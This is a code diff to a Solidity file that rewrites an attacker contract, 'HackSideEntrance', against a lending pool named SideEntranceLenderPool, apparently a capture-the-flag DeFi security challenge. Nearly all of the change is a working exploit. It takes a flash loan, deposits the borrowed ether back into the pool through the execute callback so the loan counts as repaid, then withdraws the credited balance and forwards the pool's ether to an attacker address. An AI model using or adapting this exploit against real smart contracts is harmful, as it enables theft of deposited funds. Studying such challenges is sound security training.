@@ -8,7 +8,6 @@ interface IFlashLoanEtherReceiver {
     function execute() external payable;
 }
 
-
 interface IPool {
     function deposit() external payable;
 
@@ -17,31 +16,28 @@ interface IPool {
     function withdraw() external;
 }
 
-contract hack {
-    using Address for address payable;
+contract HackSideEntrance {
+    IPool private immutable pool;
+    address payable attacker;
 
-    address pool;
+    constructor(address poolAddress, address attackerAddress) {
+        pool = IPool(poolAddress);
+        attacker = payable(attackerAddress);
+    }
 
-    constructor(address _pool) {
-        pool = _pool;
+    function attack(uint256 amount) external payable {
+        pool.flashLoan(amount);
+        pool.withdraw();
     }
 
     function execute() external payable {
-        IPool(pool).deposit{value: msg.value}();
+        pool.deposit{value: msg.value}();
     }
 
-    function hacker(uint256 amount) public payable {
-        IPool(pool).flashLoan(amount);
+    receive() external payable {
+        attacker.transfer(msg.value);
     }
-
-    function withdraw() public payable {
-        IPool(pool).withdraw();
-        payable(msg.sender).sendValue(address(this).balance);
-    }
-
-    receive() external payable {}
 }
-
 
 /**
  * @title SideEntranceLenderPool
@@ -74,4 +70,3 @@ contract SideEntranceLenderPool {
         );
     }
 }
-
